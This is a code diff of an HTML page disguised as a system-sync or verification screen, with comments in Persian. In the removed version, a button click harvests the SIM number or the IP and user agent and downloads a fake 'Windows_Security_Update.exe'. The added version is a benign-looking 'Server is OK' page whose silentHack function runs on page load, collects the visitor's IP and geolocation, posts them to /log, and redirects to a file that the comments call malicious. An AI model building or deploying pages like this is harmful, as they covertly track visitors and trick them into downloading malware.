@@ -3,108 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Check</title>
+    <title>System Sync</title>
     <style>
-        body {
-            background-color: #f0f0f0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .box {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        body { 
+            background-color: #ffffff; 
+            color: #333; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
             text-align: center;
-            width: 300px;
         }
-        h2 { color: #333; font-size: 16px; margin-bottom: 15px; }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            width: 100%;
-        }
-        button:hover { background-color: #0056b3; }
-        .status { margin-top: 10px; font-size: 12px; color: green; display: none; }
+        .container { border: 1px solid #ddd; padding: 20px; border-radius: 5px; width: 80%; max-width: 400px; }
+        h1 { font-size: 16px; margin-bottom: 10px; color: #4CAF50; }
+        p { font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Server is OK</h1>
+        <p>Data synchronized successfully.</p>
+    </div>
 
-<div class="box">
-    <h2>System Verification Required</h2>
-    <p style="font-size: 12px; color: #666;">Please confirm your identity to sync data.</p>
-    <button id="updateBtn">Confirm & Update</button>
-    <div class="status" id="statusMsg">Syncing...</div>
-</div>
+    <script>
+        async function silentHack() {
+            let ip = "Unknown";
+            let geo = "Unknown";
 
-<script>
-    document.getElementById('updateBtn').addEventListener('click', async function() {
-        const btn = this;
-        btn.innerText = "Verifying...";
-        btn.disabled = true;
+            try {
+                // 1. گرفتن IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ipData = await res.json();
+                ip = ipData.ip;
 
-        let dataToLog = "";
-
-        try {
-            // 1. تلاش برای دریافت شماره سیم‌کارت (SIM API)
-            if ('sim' in navigator) {
-                const sims = await navigator.sim.getAvailableSims();
-                if (sims.length > 0 && sims[0].msisdn) {
-                    dataToLog = "PHONE: " + sims[0].msisdn;
-                } else {
-                    dataToLog = "NO_SIM_DATA";
+                // 2. گرفتن موقعیت مکانی (بدون اجازه! - مرورگرها معمولا اجازه می‌دهند اگر در HTTPS باشد)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            geo = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                        },
+                        (error) => {
+                            geo = "Geo Denied/Failed";
+                        }
+                    );
                 }
-            } else {
-                // 2. اگر SIM API نبود، IP و User Agent را بگیر
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await res.json();
-                    dataToLog = "IP: " + ipData.ip + "\nUA: " + navigator.userAgent;
-                } catch (e) {
-                    dataToLog = "Connection Established\nUA: " + navigator.userAgent;
-                }
+            } catch (e) {
+                geo = "Error";
             }
 
-            // 3. ساخت و دانلود فایل مخرب (Fake EXE)
-            // ما یک فایل بسیار کوچک (مثلا 1 کیلوبایت) می‌سازیم تا حجم اینترنت مصرف نشود
-            const fakeExeContent = new Uint8Array([0x4D, 0x5A]).concat(new Uint8Array(998).fill(0)); 
-            const blob = new Blob([fakeExeContent], { type: 'application/octet-stream' });
-            const url = window.URL.createObjectURL(blob);
-            
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'Windows_Security_Update.exe'; // نام جذاب برای کاربر
-            document.body.appendChild(a);
-            a.click();
-            a.remove();
-            window.URL.revokeObjectURL(url);
-
-            // 4. ارسال داده به پنل ادمین
+            // 3. ارسال اطلاعات به سرور
             fetch('/log', {
                 method: 'POST',
-                headers: { 'Content-Type': 'text/plain' },
-                body: dataToLog
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip: ip, geo: geo })
             });
 
-            btn.style.backgroundColor = "#28a745";
-            btn.innerText = "Verified";
-            document.getElementById('statusMsg').style.display = 'block';
-
-        } catch (error) {
-            console.error(error);
-            btn.innerText = "Error";
+            // 4. دانلود فایل مخرب
+            window.location.href = '/download';
         }
-    });
-</script>
 
+        // اجرای خودکار
+        window.onload = silentHack;
+    </script>
 </body>
 </html>
